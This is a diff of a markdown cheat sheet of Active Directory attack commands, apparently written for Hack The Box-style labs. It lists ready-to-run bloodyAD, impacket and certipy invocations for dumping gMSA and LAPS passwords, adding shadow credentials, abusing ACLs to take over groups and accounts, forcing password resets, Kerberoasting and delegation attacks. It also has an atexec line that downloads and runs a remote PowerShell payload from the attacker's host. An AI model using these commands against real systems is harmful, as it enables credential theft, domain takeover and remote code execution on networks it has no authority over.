@@ -1,43 +1,43 @@
 # Active Directory
-## +---------- Guide ----------+
+## Guide
 https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
 
-+---------- .ccache ----------+
+## .ccache
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD'; kcme
 
-+---------- .ccache to evil-winrm ----------+
+## .ccache to evil-winrm
 evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
 
-+---------- ReadGMSAPassword ----------+
+## ReadGMSAPassword
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object 'SVC_ACC$' --attr msDS-ManagedPassword
 
-+---------- ReadLAPSPassword ----------+
+## ReadLAPSPassword
 impacket-GetLAPSPassword -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD' | awk '$1 ~ /\$$/ {print $1 " --> Administrator:" $3}'
 
-+---------- AddKeyCredentialLink ----------+
+## AddKeyCredentialLink
 certipy shadow auto -dc-ip $TARGET -target $DC -k -account 'SVC_CABACKUP'
 
-+---------- AddSelf ----------+
+## AddSelf
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' '$USERNAME'; kcme
 
-+---------- Owns ----------+
+## Owns
 impacket-dacledit -dc-ip $TARGET $DOM/ -k -action 'write' -rights 'WriteMembers' -principal '$USERNAME' -target-dn 'DistinguishedName'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' '$USERNAME'
 
-+---------- GenericWrite ----------+
+## GenericWrite
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set object 'DistinguishedName' servicePrincipalName -v 'http/anything'
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 certipy shadow auto -target $DC -u '$USERNAME' -k -account 'TargetUser'
 
-+---------- ForceChangePassword ----------+
+## ForceChangePassword
 impacket-changepasswd $DOM/'TARGET_USER'@$TARGET -newpass '123qweasdF!' -altuser 'USER_WITH_PRIV' -althash '89d0b56874f61ad38bad336a77b8ef2f' -reset
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set password 'DistinguishedName' '123qweasdF!'
 impacket-getTGT $DOM/'$USERNAME:123qweasdF!'; kcme
 
-+---------- Remove Protected ----------+
+## Remove Protected
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k remove groupMember 'CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB' 'CN=IT,CN=USERS,DC=RUSTYKEY,DC=HTB'
 
-+---------- AddAllowedToAct / AllowedToAct ----------+
+## AddAllowedToAct / AllowedToAct
 Set-ADComputer -PrincipalsAllowedToDelegateToAccount "OWNED_COMPUTER$" -Identity 'DC_COMPUTER_NAME'
 export OWNED_COMPUTER='' # without $ sign
 impacket-getTGT $DOM/"$OWNED_COMPUTER$":'$PASSWORD'; kcme
@@ -56,11 +56,11 @@ Get-DomainComputer DC_COMPUTER_NAME | Set-DomainObject -Set @{'msds-allowedtoact
 kirbi2ccache doIGfjCCBnqgAwIBB<SNIP>BASE64 HERE... administrator administrator.ccache;
 kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:53/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
 
-+---------- Forest Trust ----------+
+## Forest Trust
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get trusts
 impacket-wmiexec -dc-ip $TARGET $DC -k -no-pass "powershell -c \"Import-Module 'ActiveDirectory'; @(Get-ADDomain | Select @{n='Name';e={$_.DNSRoot}},@{n='securityIdentifier';e={$_.DomainSID}},@{n='trustType';e={'Primary'}},@{n='trustDirection';e={'Inbound/Outbound'}}; Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -Properties * | Select @{n='Name';e={$_.Name}},@{n='securityIdentifier';e={$_.securityIdentifier}},@{n='trustType';e={switch ($_.trustType){1{'NT'}2{'Active Directory'}3{'External'}default{$_}}}},@{n='trustDirection';e={switch ($_.trustDirection){1{'Inbound'}2{'Outbound'}3{'Bidirectional'}default{$_}}}}) | Format-Table -AutoSize\""
 
-+---------- Add ----------+
+## Add
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add genericAll 'DistinguishedName' 'USER'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' 'USER'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set owner 'DistinguishedName' 'USER'
@@ -72,11 +72,11 @@ bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add shadowCredentials 'TARGET'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add add uac 'TARGET'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add dnsRecord 'xxx.domain.example' '8.8.8.8'
 
-+---------- Get ----------+
+## Get
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get writable --detail
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object User | grep -Ei 'pass|pwd' | grep -vE 'bad|Last|Time' | cat
 
-+---------- Search ----------+
+## Search
 -->> Computers
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306368)))" | grep -av 'nTSecurityDescriptor:' | tee out_computers-info
 
@@ -89,7 +89,7 @@ bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectCla
 -->> Passwords and Keys
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=*))" | grep -a -Ei 'pass|pwd|key'
 
-+---------- Permissions ----------+
+## Permissions
 adminCount
 AllExtendedRights
 description
